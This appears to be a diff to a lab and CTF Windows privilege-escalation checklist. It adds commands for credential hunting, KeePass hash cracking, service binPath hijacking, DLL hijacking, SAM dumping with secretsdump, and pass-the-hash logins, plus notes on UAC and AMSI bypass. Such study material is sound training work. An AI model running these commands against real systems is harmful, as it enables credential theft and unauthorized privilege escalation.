@@ -4,12 +4,19 @@ Generic Windows attack-path checklist for authorized labs and CTF environments.
 
 Important note from the analyzed writeup set: most machines were Linux/Unix. Windows terms usually appeared as attacker-side PowerShell host discovery, Samba reporting `Windows 6.1`, LSASS dump artifacts inside Linux challenges, or Wine used for Linux privilege escalation.
 
-For domain/Kerberos-specific material, use [Active Directory Attack Path Cheat Sheet](../tools/Active%20Directory%20Attack%20Path%20Cheat%20Sheet.md).
+For domain/Kerberos-specific material, use [Active Directory Attack Path Cheat Sheet](../tools/Active%20Directory%20Attack%20Path%20Cheat%20Sheet.md). For expanded local commands, use [Windows Privilege Escalation Cheat Sheet](../tools/Windows%20Privilege%20Escalation%20Cheat%20Sheet.md).
+
+Course references integrated into this page:
+
+- Hexdump Windows Privilege Escalation full course: https://www.youtube.com/watch?v=OmW7351U8cI
+- LeonardoE95 Windows privilege escalation material: https://github.com/LeonardoE95/yt-en
+- LeonardoE95 OSCP Windows module and cheatsheet: https://github.com/LeonardoE95/OSCP
 
 Related alternatives:
 
 - [Service Enumeration Alternatives](../tools/Service%20Enumeration%20Alternatives.md)
 - [Web Attack Alternatives](../tools/Web%20Attack%20Alternatives.md)
+- [Windows Privilege Escalation Cheat Sheet](../tools/Windows%20Privilege%20Escalation%20Cheat%20Sheet.md)
 
 Use this page for native Windows targets when they appear, and for the Windows-adjacent cases found in the writeups.
 
@@ -146,9 +153,12 @@ whoami /groups
 hostname
 ipconfig /all
 net user
+net accounts
 net localgroup administrators
 net localgroup "Remote Management Users"
 systeminfo
+route print
+netstat -ano
 cmdkey /list
 ```
 
@@ -156,10 +166,23 @@ PowerShell:
 
 ```powershell
 Get-LocalUser
+Get-LocalGroup
 Get-LocalGroupMember Administrators
+dir env:
+Get-Process
 Get-ChildItem -Force C:\Users
 Get-ChildItem -Recurse -Force C:\Users -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd|secret|token"
+Get-Service * | Select-Object DisplayName,Status,ServiceName,Can*
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}
 Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True
+```
+
+Installed application hints:
+
+```cmd
+wmic product get name,version
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
 ```
 
 ## Credential Hunting
@@ -176,6 +199,21 @@ Common files:
 
 ```powershell
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+Fast file hunting:
+
+```powershell
+Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.config,*.xml,*.ini,*.bak,*.zip -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include web.config,unattend.xml,sysprep.inf,ConsoleHost_history.txt -File -Recurse -ErrorAction SilentlyContinue
+Select-String -Path C:\Users\*\* -Pattern "password","passwd","pwd","secret","token" -ErrorAction SilentlyContinue
+```
+
+If a KeePass database appears, extract and crack it offline:
+
+```bash
+keepass2john Database.kdbx > keepass.hash
+john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 ## Common Windows Privilege Escalation Checks
@@ -198,6 +236,16 @@ Service alternatives seen in Sec-Fortress winprivesc notes:
 - insecure GUI apps launched elevated
 - token impersonation
 
+Course-style order of operations:
+
+1. Confirm context with `whoami /priv`, `whoami /groups`, `systeminfo`, users, network routes, and listening ports.
+2. Hunt credentials in user files, PowerShell history, app configs, KeePass databases, Windows Vault, and saved `cmdkey` entries.
+3. Review services for weak permissions, writable binaries, unquoted paths, and unsafe DLL loads.
+4. Check policy/registry paths such as `AlwaysInstallElevated`, autoruns, Winlogon, and service registry entries.
+5. Review scheduled tasks and scripts that run as privileged users.
+6. If privileges allow it, extract SAM/SYSTEM/SECURITY hives or parse LSASS artifacts offline in scope.
+7. Use automated tools such as winPEAS or PrivescCheck to confirm, then reproduce the path manually.
+
 Unquoted service paths:
 
 ```cmd
@@ -208,6 +256,43 @@ Writable service binary/path:
 
 ```powershell
 Get-Acl "C:\Path\To\Service.exe"
+```
+
+If service configuration is writable in a lab:
+
+```cmd
+sc qc ServiceName
+sc config ServiceName binPath= "C:\Windows\Temp\payload.exe"
+sc stop ServiceName
+sc start ServiceName
+```
+
+DLL hijacking:
+
+- use when a privileged process loads a DLL from a writable directory or has a missing DLL search path
+- confirm with ProcMon, logs, or repeatable service behavior
+- compile the DLL for the target architecture
+
+```cmd
+icacls "C:\Program Files\App"
+```
+
+Scheduled tasks:
+
+```cmd
+schtasks /query /fo LIST /v
+dir C:\Windows\Tasks
+dir C:\Windows\System32\Tasks
+icacls "C:\Path\TaskScript.bat"
+```
+
+Critical registry checks:
+
+```cmd
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query HKLM\SYSTEM\CurrentControlSet\Services\ServiceName
 ```
 
 Privileges:
@@ -251,6 +336,48 @@ Then parse offline with Impacket in an authorized lab:
 ```bash
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
+
+Pass-the-hash follow-up when hashes are valid for a scoped Windows service:
+
+```bash
+evil-winrm -i ip -u user -H NTHASH
+impacket-wmiexec DOMAIN/user@ip -hashes :NTHASH
+```
+
+UAC bypass is not a first foothold. Use it only when the current user is already in a local administrator group but the process is medium integrity.
+
+Cross-compile Windows payloads from Linux when the target lacks a compiler:
+
+```bash
+x86_64-w64-mingw32-gcc payload.c -o payload.exe
+x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
+```
+
+AMSI friction usually appears when PowerShell payloads are blocked. Prefer simple signed scripts, local compiled tools, or transparent commands first; treat bypass material as a separate controlled lab topic.
+
+## Hexdump Windows Privilege Escalation Course Map
+
+Use this map to choose what to study after a machine shows a matching signal:
+
+- Windows shells: when you need `cmd.exe`, PowerShell, file transfer, and reverse-shell basics.
+- Windows permissions: when ACLs, local groups, or object permissions control the route.
+- Reverse shells: when web upload, service abuse, or command execution needs an interactive callback.
+- `SeImpersonatePrivilege`: when `whoami /priv` shows impersonation rights in a service context.
+- Cross compilation: when you need a custom EXE or DLL and the target has no compiler.
+- Windows services: when a privileged service can be queried, restarted, or reconfigured.
+- Weak service permissions: when `sc qc`, AccessChk, or ACLs show service control rights.
+- Unquoted service path: when an auto-start service path has spaces, no quotes, and writable parent components.
+- DLL hijacking: when a privileged process loads from a writable or missing DLL path.
+- UAC bypass: when the user is already local admin but the process is not elevated.
+- AlwaysInstallElevated: when both HKCU and HKLM installer policy values are enabled.
+- Files with sensitive data: when user directories, configs, backups, or KeePass files are readable.
+- Windows hashes: when SAM/SYSTEM/SECURITY hives or LSASS artifacts are available in scope.
+- Stored credentials and Windows Vault: when `cmdkey /list`, browser data, or credential XML files appear.
+- Scheduled tasks: when a privileged task references a writable script, binary, or directory.
+- Critical registry paths: when autoruns, Winlogon, service config, or startup keys are writable.
+- Useful tools: when winPEAS, PrivescCheck, Seatbelt, or Sysinternals can confirm a manual hypothesis.
+- AMSI bypass: when a controlled PowerShell lab intentionally focuses on script-blocking behavior.
+- Cheatsheet and methodology: when building a repeatable checklist for OSCP-style boxes.
 
 ## LSASS Dump Artifact Scenario
 
